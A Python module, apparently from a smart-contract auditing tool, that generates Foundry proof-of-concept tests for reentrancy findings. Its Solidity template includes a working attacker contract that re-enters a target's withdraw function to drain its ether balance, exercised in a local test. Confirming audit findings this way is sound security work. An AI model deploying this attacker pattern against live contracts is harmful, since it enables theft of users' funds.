"""Render bounded Foundry PoC sources from explicit finding evidence."""
from __future__ import annotations

import json
import re
from pathlib import PurePosixPath


def _target(source_bundle: dict) -> tuple[str, str] | None:
    metadata = source_bundle.get("metadata") if isinstance(source_bundle.get("metadata"), dict) else {}
    settings = metadata.get("settings") if isinstance(metadata.get("settings"), dict) else {}
    targets = settings.get("compilationTarget")
    if not isinstance(targets, dict) or len(targets) != 1:
        return None
    source_unit, contract = next(iter(targets.items()))
    if not isinstance(source_unit, str) or not isinstance(contract, str):
        return None
    path = PurePosixPath(source_unit)
    if "\\" in source_unit or path.is_absolute() or ".." in path.parts or not re.fullmatch(r"[A-Za-z_$][A-Za-z0-9_$]*", contract):
        return None
    return source_unit, contract


def _source_contract(source_bundle: dict) -> tuple[str, str] | None:
    target = _target(source_bundle)
    if target:
        return target
    sources = source_bundle.get("sources") if isinstance(source_bundle.get("sources"), dict) else {}
    for source_unit, entry in sources.items():
        content = entry.get("content") if isinstance(entry, dict) else None
        match = re.search(r"\bcontract\s+([A-Za-z_$][A-Za-z0-9_$]*)\b", content or "")
        if match and isinstance(source_unit, str) and "\\" not in source_unit and ".." not in PurePosixPath(source_unit).parts:
            return source_unit, match.group(1)
    return None


def _finding_text(finding: dict) -> str:
    return json.dumps(finding, ensure_ascii=False, sort_keys=True).lower()


def _reentrancy_template(finding: dict, source_bundle: dict, test_name: str) -> str | None:
    target = _source_contract(source_bundle)
    if not target:
        return None
    source_unit, contract = target
    sources = source_bundle.get("sources", {})
    content = sources.get(source_unit, {}).get("content", "") if isinstance(sources.get(source_unit), dict) else ""
    deposit = "depositFunds" if re.search(r"\bdepositFunds\s*\(", content) else "deposit" if re.search(r"\bdeposit\s*\(", content) else None
    withdraw = "withdrawFunds" if re.search(r"\bwithdrawFunds\s*\(", content) else "withdraw" if re.search(r"\bwithdraw\s*\(", content) else None
    if not deposit or not withdraw:
        return None
    withdraw_signature = f"{withdraw}(uint256)" if re.search(rf"\b{re.escape(withdraw)}\s*\([^)]*uint", content) else f"{withdraw}()"
    encoded_withdraw = f'abi.encodeWithSignature("{withdraw_signature}", amount)' if withdraw_signature.endswith("(uint256)") else f'abi.encodeWithSignature("{withdraw_signature}")'
    return f'''// SPDX-License-Identifier: MIT
pragma solidity >=0.8.19;
import "../src/{source_unit}";

interface Vm {{
    function deal(address who, uint256 amount) external;
    function warp(uint256 timestamp) external;
}}

contract ReentrancyAttacker {{
    address payable immutable target;
    uint256 immutable amount;
    bool attacking;

    constructor(address payable target_, uint256 amount_) {{ target = target_; amount = amount_; }}

    function attack() external payable {{
        (bool deposited,) = target.call{{value: msg.value}}(abi.encodeWithSignature("{deposit}()"));
        require(deposited, "attacker deposit failed");
        attacking = true;
        (bool withdrawn,) = target.call({encoded_withdraw});
        require(withdrawn, "attacker withdraw failed");
        attacking = false;
    }}

    receive() external payable {{
        if (attacking && address(target).balance >= amount) {{
            (bool ok,) = target.call({encoded_withdraw});
            require(ok, "reentrant withdraw failed");
        }}
    }}
}}

contract GeneratedPoC {{
    Vm private constant vm = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));

    function {test_name}() public {{
        vm.warp(2 weeks);
        {contract} target = new {contract}();
        vm.deal(address(this), 2 ether);
        (bool seeded,) = address(target).call{{value: 1 ether}}(abi.encodeWithSignature("{deposit}()"));
        require(seeded, "victim deposit failed");
        ReentrancyAttacker attacker = new ReentrancyAttacker(payable(address(target)), 1 ether);
        attacker.attack{{value: 1 ether}}();
        require(address(target).balance == 0, "reentrancy did not drain target");
    }}
}}
'''


def render_test(finding: dict, source_bundle: dict, test_name: str) -> str | None:
    """Return a complete Solidity test only when the evidence is executable."""
    if not isinstance(finding, dict) or not isinstance(source_bundle, dict):
        return None
    text = _finding_text(finding)
    if "reentr" in text:
        return _reentrancy_template(finding, source_bundle, test_name)
    return None
